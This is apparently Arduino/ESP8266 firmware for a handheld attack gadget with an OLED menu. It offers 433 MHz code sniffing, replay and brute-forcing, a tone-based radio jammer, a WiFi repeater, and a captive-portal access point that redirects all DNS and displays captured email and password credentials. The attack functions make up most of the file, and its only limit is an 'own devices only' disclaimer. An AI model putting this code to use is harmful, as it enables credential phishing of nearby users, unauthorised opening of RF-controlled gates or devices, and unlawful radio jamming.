/********************************************************************
  Created by Mateusz Bielak


   Uses SSD1306Ascii Library(https://github.com/greiman/SSD1306Ascii)
   by Bill Grieman
  
   Uses FastLED Library  https://github.com/FastLED/FastLED
  by Daniel Garcia and Mark Kriegsman
   
 Uses Rc-switch Library  https://github.com/sui77/rc-switch
  by Suat Özgür

Uses Rc-switch Library  https://github.com/sui77/rc-switch
  by Suat Özgür


Warning! Use it only for educational purposes purposes on your own devices.
 Author don't take any responsibility !!!!

********************************************************************/
#include <Arduino.h>
#include <Wire.h>
#include "SSD1306Ascii.h"
#include "SSD1306AsciiWire.h"

#include <menu.h>
#include <menuIO/SSD1306AsciiOut.h>
#include <menuIO/keyIn.h>


#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>
using namespace Menu;

SSD1306AsciiWire oled;
#include "config.h"
#include "wificaptive.h"
#include "repeater.h"
#include <RCSwitch.h>
RCSwitch mySwitch = RCSwitch();

#include <EEPROM.h>

long value ;
int bitlength ;
int protocol; // Variables 
int pulselength ; 
int sniffSW;
int repeat;
int btfSW;
int swcounter;
long frequency;
int jammerSW; 
int wificapSW;
int repeaterSW;



const char* const alphaNum[] MEMMODE = {" 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.,+-_"};
char wifinamechar[]="                                    ";
char  wifipasschar[]="                                   ";



result info(eventMask e, prompt &item);
result datasniff(eventMask e, prompt &item);
result datawifi(eventMask e, prompt &item);

result reset(eventMask e) {        // Reset function 
value = 0 ;
protocol = 0;
bitlength = 0;
pulselength = 0;
repeat = 2;
frequency = 1000; 
  return proceed;
}


  void bruteforcef() {
  
    mySwitch.send(value, bitlength);
    mySwitch.send(value, bitlength);
    value++;
    
  }

  void sniffswitch() {
    if (mySwitch.available()) {
    value = mySwitch.getReceivedValue();
    bitlength = mySwitch.getReceivedBitlength();
    protocol = mySwitch.getReceivedProtocol();
    pulselength = mySwitch.getReceivedDelay();
  }
  }


void tones() {    // olny for esp 

analogWriteFreq(frequency);
analogWrite(15,512); // only for esp8266.If you using arduino, use tone(pin,freuency); in void loop, and comment this whole void tones. 

}


result jammerswOn() {
  jammerSW = 1 ;
   
  return proceed;
}

result jammerswOff() {
  jammerSW = 0 ;
  //noTone(15); 
  analogWriteFreq(0);
  analogWrite(15,0);
  
  return proceed;
}


// Sniff on/off

result sniffOn() {
  mySwitch.resetAvailable();
  sniffSW = 1 ;
   value = mySwitch.getReceivedValue();
    bitlength = mySwitch.getReceivedBitlength();
    protocol = mySwitch.getReceivedProtocol();
  pulselength = mySwitch.getReceivedDelay() ;
  return proceed;
}

result sniffOff() {
  sniffSW = 0 ;
  
  return proceed;
}

// End Sniff

// Bruteforce on/off
result btfswOn() {
  btfSW = 1 ;
   mySwitch.setProtocol(protocol);
    mySwitch.setPulseLength(pulselength);
  
  return proceed;
}


result btfswOff() {
  btfSW = 0 ;

  
  return proceed;
}

// End Bruteforce On/OFf

//Wifi

result wifiswOn() {
  
   bootTime = lastActivity = millis();
   WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
  webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
   
  return proceed;
}

result wifiswOff() {
 WiFi.mode(WIFI_OFF);
  
  return proceed;
}





result repeaterswOn() {
String wifiname(wifinamechar);
 String wifipass(wifipasschar);
wifiname.trim();
  wifipass.trim();
#if HAVE_NETDUMP
  phy_capture = dump;
#endif

  // first, connect to STA so we can get a proper local DNS server
 
  WiFi.mode(WIFI_STA);
  WiFi.begin(wifiname, wifipass);
 // while (WiFi.status() != WL_CONNECTED) {
   // Serial.print('.');
    //delay(500);
  //}
  Serial.printf("\nSTA: %s (dns: %s / %s)\n",
                WiFi.localIP().toString().c_str(),
                WiFi.dnsIP(0).toString().c_str(),
                WiFi.dnsIP(1).toString().c_str());

  // give DNS servers to AP side
  dhcps_set_dns(0, WiFi.dnsIP(0));
  dhcps_set_dns(1, WiFi.dnsIP(1));

  WiFi.softAPConfig(  // enable AP, with android-compatible google domain
    IPAddress(172, 217, 28, 254),
    IPAddress(172, 217, 28, 254),
    IPAddress(255, 255, 255, 0));
  WiFi.softAP("ext", "password1234");
  Serial.printf("AP: %s\n", WiFi.softAPIP().toString().c_str());

  Serial.printf("Heap before: %d\n", ESP.getFreeHeap());
  err_t ret = ip_napt_init(NAPT, NAPT_PORT);
  Serial.printf("ip_napt_init(%d,%d): ret=%d (OK=%d)\n", NAPT, NAPT_PORT, (int)ret, (int)ERR_OK);
  if (ret == ERR_OK) {
    ret = ip_napt_enable_no(SOFTAP_IF, 1);
    Serial.printf("ip_napt_enable_no(SOFTAP_IF): ret=%d (OK=%d)\n", (int)ret, (int)ERR_OK);
    if (ret == ERR_OK) {
     // Serial.printf("WiFi Network '%s' with same password is now NATed behind '%s'\n", wifiname ,"extender", wifipass);
    }
  }
  Serial.printf("Heap after napt init: %d\n", ESP.getFreeHeap());
  if (ret != ERR_OK) {
    Serial.printf("NAPT initialization failed\n");
    
  }

  
  return proceed;
}

result repeaterswOff() {
 WiFi.mode(WIFI_OFF);
  
  return proceed;
}

//End Wifi


TOGGLE(btfSW, btfsw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle        // Bruteforce switch  on/off
       
       , VALUE("[Off]", 0, btfswOff, enterEvent)
       , VALUE("[On]", 1, btfswOn, enterEvent)
      );


TOGGLE(sniffSW, sniffsw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle    // Sniff Switch on/off
       
       , VALUE("[Off]", 0, sniffOff, enterEvent)
       , VALUE("[On]", 1, sniffOn, enterEvent)
      );


TOGGLE(jammerSW, jammersw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle    
       
       , VALUE("[Off]", 0, jammerswOff, enterEvent)
       , VALUE("[On]", 1,  jammerswOn, enterEvent)
      );


      TOGGLE(wificapSW, wifisw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle   
       
       , VALUE("[Off]", 0, wifiswOff, enterEvent)
       , VALUE("[On]", 1,  wifiswOn, enterEvent)
      );


      TOGGLE(repeaterSW, repeatersw, "Start|Stop", doNothing, noEvent, noStyle //,doExit,enterEvent,noStyle   
       
       , VALUE("[Off]", 0, repeaterswOff, enterEvent)
       , VALUE("[On]", 1,  repeaterswOn, enterEvent)
      );


result rcrcv() {        // Empty shell for field option 

  
  return proceed;
}


result snd() {
  do {
 mySwitch.setProtocol(protocol);
 mySwitch.setPulseLength(pulselength);
    mySwitch.send(value, bitlength);            // Send function
    swcounter++ ;
    delay(1);  // necessary!! without delay after 10 repeat's gives restart 
    
  } while ( swcounter <= repeat );
  swcounter = 1 ;
  repeat = 2 ;
  return proceed;
}





result showEvent(eventMask e, navNode& nav, prompt& item) {

  return proceed;
}






// MENU




MENU(Repeater, "Repeater", showEvent, anyEvent, noStyle
    , SUBMENU(repeatersw) 
    ,EDIT("Name",wifinamechar,alphaNum,doNothing,noEvent,noStyle) // TESTY
    ,EDIT("Password",wifipasschar,alphaNum,doNothing,noEvent,noStyle) // TESTY
    , EXIT("<Back")
    );


MENU(CaptivePortal, "CaptivePortal", showEvent, anyEvent, noStyle
    , SUBMENU(wifisw) 
    , OP("Show CapData", dtwifi, enterEvent)
    , EXIT("<Back")
    );



MENU(Wifi, "Wifi", showEvent, anyEvent, noStyle                                    
    , SUBMENU(CaptivePortal) 
    , SUBMENU(Repeater) 
    , EXIT("<Back")
     );


MENU(Jammer, "Jammer", showEvent, anyEvent, noStyle                                    // Sniffing Sub-Submenu
    , FIELD(frequency, "Freq: ", "Hz", 0, 65535, 1000, 100, rcrcv, enterEvent, wrapStyle)      // Set variables value
    , SUBMENU(jammersw)                                                                 // Submenu Sniffer
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")
     );



MENU(BruteForce, "BruteForce-slow", showEvent, anyEvent, noStyle                        // Bruteforce Sub-Submenu 
    , SUBMENU(btfsw)                                                                    // Switch on/off
    , FIELD(value, "Code: ", "", 0, 1000000000, 1000, 10, rcrcv, enterEvent, wrapStyle)   // Set variables value
    , FIELD(bitlength, "Bitlength: ", "", 0, 500, 10, 1, rcrcv, enterEvent, wrapStyle)   // Set variables value
    , FIELD(protocol, "Protocol: ", "", 0, 100, 10, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(pulselength, "Pulselength: ", "", 0, 3000, 10, 1, rcrcv, enterEvent, wrapStyle)
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")                                                                     // Exit
     );

MENU(Send, "Send", showEvent, anyEvent, noStyle                                           // Send Sub-Submenu 
    , OP("[Send]", snd, enterEvent)                                                       // Send 
    , FIELD(value, "Code: ", "", 0, 10000000000, 100, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(bitlength, "Bitlength: ", "", 0, 500, 10, 1, rcrcv, enterEvent, wrapStyle)     // Set variables value
    , FIELD(protocol, "Protocol: ", "", 0, 100, 10, 1, rcrcv, enterEvent, wrapStyle)       // Set variables value
    , FIELD(pulselength, "Pulselength: ", "", 0, 3000, 10, 1, rcrcv, enterEvent, wrapStyle)
    , FIELD(repeat, "Repeat: ", "x", 0, 1000, 10, 1, rcrcv, enterEvent, wrapStyle)         // Set variables value
    , OP("Reset", reset, enterEvent)                                                      // Reset
    , EXIT("<Back")                                                                       // Exit
     );

MENU(Save,"Save",doNothing,anyEvent,wrapStyle
  ,OP("Slot 1",Save1,enterEvent)
  ,OP("Slot 2",Save2,enterEvent)
  ,OP("Slot 3",Save3,enterEvent)
  ,OP("Slot 4",Save4,enterEvent)
  ,OP("Slot 5",Save5,enterEvent)
  ,EXIT("<Back")
);


MENU(Load,"Load",doNothing,anyEvent,wrapStyle
  ,OP("Slot 1",Load1,enterEvent)
  ,OP("Slot 2",Load2,enterEvent)
  ,OP("Slot 3",Load3,enterEvent)
  ,OP("Slot 4",Load4,enterEvent)
  ,OP("Slot 5",Load5,enterEvent)
  ,EXIT("<Back")
);

MENU(Snif, "Sniff", showEvent, anyEvent, noStyle                                    // Sniffing Sub-Submenu
    , FIELD(value, "Code: ", "", 0, 10000000000, 100000, 1, rcrcv, enterEvent, wrapStyle)      // Set variables value
    , SUBMENU(sniffsw)                                                                 // Submenu Sniffer
    , OP("Show Data", dtsnf, enterEvent)
    , OP("Reset", reset, enterEvent)                                                    // Reset
    , EXIT("<Back")
     );


     
MENU(rf, "RF_433", showEvent, anyEvent, noStyle                                       // Rf433 Submenu
     , SUBMENU(Snif)                                                                  // Sniff Submenu
     , SUBMENU(Send)                                                                  // Send Submenu
     , SUBMENU(BruteForce)                                                            // Bruteforce Submenu
     , SUBMENU(Jammer)
     , SUBMENU(Save)
     , SUBMENU(Load)
     , EXIT("<Back")                                                                  // Exit
    );



    MENU(mainMenu, "Main menu", doNothing, noEvent, wrapStyle                          // Mainmenu 
    , SUBMENU(rf)                                                                      // Rf_433 Submenu
    , SUBMENU(Wifi)  
    , OP("Info", inf, enterEvent)
    //, EXIT("<Back")
    );


//END MENU



const panel panels[] MEMMODE = {{0, 0, 128 / fontW, 64 / fontH}};
navNode* nodes[sizeof(panels) / sizeof(panel)]; //navNodes to store navigation status
panelsList pList(panels, nodes, 1); //a list of panels and nodes
idx_t tops[MAX_DEPTH] = {0, 0}; //store cursor positions for each level

#ifdef LARGE_FONT
SSD1306AsciiOut outOLED(&oled, tops, pList, 8, 2); //oled output device menu driver

#else
SSD1306AsciiOut outOLED(&oled, tops, pList, 5, 1); //oled output device menu driver
#endif


menuOut* constMEM outputs[]  MEMMODE  = {&outOLED}; //list of output devices
outputsList out(outputs, 1); //outputs list

#ifdef NAV_BUTTONS_INPUT_PULLUP
//build a map of keys to menu commands
keyMap joystickBtn_map[] = {
  { -BTN_SEL, defaultNavCodes[enterCmd].ch} ,
  { -BTN_UP, defaultNavCodes[upCmd].ch} ,
  { -BTN_DOWN, defaultNavCodes[downCmd].ch}  ,
  { -BTN_ESC, defaultNavCodes[escCmd].ch}  ,
};
keyIn<TOTAL_NAV_BUTTONS> joystickBtns(joystickBtn_map);//the input driver
#else
//build a map of keys to menu commands
keyMap joystickBtn_map[] = {
  { BTN_SEL, defaultNavCodes[enterCmd].ch} ,
  { BTN_UP, defaultNavCodes[upCmd].ch} ,
  { BTN_DOWN, defaultNavCodes[downCmd].ch}  ,
  { BTN_ESC, defaultNavCodes[escCmd].ch},
};

keyIn<TOTAL_NAV_BUTTONS> joystickBtns(joystickBtn_map);//the input driver
#endif

NAVROOT(nav, mainMenu, MAX_DEPTH, joystickBtns, out);




result info(menuOut& o, idleEvent e) {
  if (e == idling) {
    oled.setFont(System5x7);
    o.setCursor(0, 0);
    o.print("Version 1.0");
    o.setCursor(0, 1);
    o.print("MBiel " );
    o.setCursor(0, 2);
    o.print("mtoolgit@gmail.com");
    o.setCursor(0, 3);
    o.print("Ok to Exit...");
     oled.setFont(menuFont);
  }
  return proceed;
}


result inf(eventMask e, prompt &item) {
  nav.idleOn(info);
  return proceed;
}

result datasniff(menuOut& o, idleEvent e) {
  if (e == idling) {
    o.setCursor(0, 0);
    o.print(value);
    o.setCursor(0, 1);
    o.print(bitlength );
    o.setCursor(0, 2);
    o.print(protocol);
    o.setCursor(0, 3);
    o.print(pulselength);
  }
  return proceed;
}


result dtsnf(eventMask e, prompt &item) {
  nav.idleOn(datasniff);
  return proceed;
}


result datawifi(menuOut& o, idleEvent e) {
  if (e == idling) {
    oled.setFont(System5x7);
    o.setCursor(0, 1);
   o.print(EML);
    o.setCursor(0, 2);
   o.print(PASS);
   oled.setFont(menuFont);
   o.setCursor(0, 3);
   o.print("Ok to Exit...");
    
  }
  return proceed;
}


result dtwifi(eventMask e, prompt &item) {
  nav.idleOn(datawifi);
  return proceed;
}


//when menu is suspended
/*result idle(menuOut &o, idleEvent e) {
  o.clear();
  switch (e) {
    case idleStart: o.println("suspending menu!"); break;
    case idling: o.println("suspended..."); break;
    case idleEnd: o.println("resuming menu."); break;
  }
  return proceed;
} 

*/

void setup() {
 
  delay(20);
  Wire.begin();
  oled.begin(&Adafruit128x64, OLED_I2C_ADDRESS); //check config
  oled.clear();
 // nav.idleTask = idle; //point a function to be used when menu is suspended
 mySwitch.enableReceive(0);
  mySwitch.enableTransmit(15);
  WiFi.mode(WIFI_OFF);
 
  btfSW = 0 ;
  repeat = 2 ;
  swcounter = 1 ;
  jammerSW = 0 ;
  frequency = 1000 ;
   oled.setFont(System5x7);
   oled.clear();
   oled.setCursor(0, 2);
   oled.println("          __  ___   ");  
   oled.println("         /  |/  /   ");
   oled.println(" ______ / /|_/ / __ ");
   oled.println("/_  __//_/ _/_/ / / ");
   oled.println(" / / / _ \/ _ \/ /__");
   oled.println("/_/  \___/\___/____/");

  delay(3000);
  oled.clear();
  oled.setCursor(0, 0);
   oled.print("Warning!");
    oled.setCursor(0, 2);
    oled.print("Use it only for testing");
    oled.setCursor(0, 3);
    oled.print("purposes on your own" );
    oled.setCursor(0, 4);
    oled.println("devices.");
    oled.setCursor(0, 5);
    oled.println("Author don't take");
    oled.setCursor(0, 6);
    oled.println("any responsibility");
    
  delay(2500);

  
  oled.setFont(menuFont);
  joystickBtns.begin();
}



void loop() {
  nav.poll();
  delay(1);//simulate a delay when other tasks are done
  
  if (sniffSW == 1) {
  sniffswitch();

  }

   if (btfSW == 1) {                    // Bruteforce
    bruteforcef();
   }

   if (jammerSW == 1) {
    tones();                    // uncomment if u using esp2866
    //tone(10, frequency);     // uncomment if u using Arduino 
   }
   
if (wificapSW == 1) {
    if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); 
}

}


    
